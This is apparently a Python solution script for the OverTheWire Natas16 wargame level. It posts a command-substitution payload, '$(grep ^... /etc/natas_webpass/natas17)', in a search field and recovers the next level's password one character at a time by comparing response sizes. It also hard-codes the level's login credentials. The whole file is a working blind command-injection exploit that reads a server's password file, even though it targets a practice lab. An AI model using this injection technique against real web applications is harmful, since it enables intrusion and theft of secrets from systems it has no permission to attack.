import requests              #type: ignore 

url="http://natas16.natas.labs.overthewire.org"
auth=("natas16","hPkjKYviLQctEW33QmuXL6eDVfMW4sGo")
data={"needle":"data"}

searchspace="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"


password=""
queryprefix="$(grep ^"
querysuffix=" /etc/natas_webpass/natas17)"


for i in range(32):
    print(f"i={i} and password so far = {password}")
    for k in searchspace:

        query=f"{queryprefix}{password}{k}{querysuffix}"
        data['needle']=query

        r=requests.post(url,auth=auth,data=data)
        size=len(r.text)

        print(query,size)

        if(size!=461926):
            password+=k
            break



            
print(f"password: {password}")

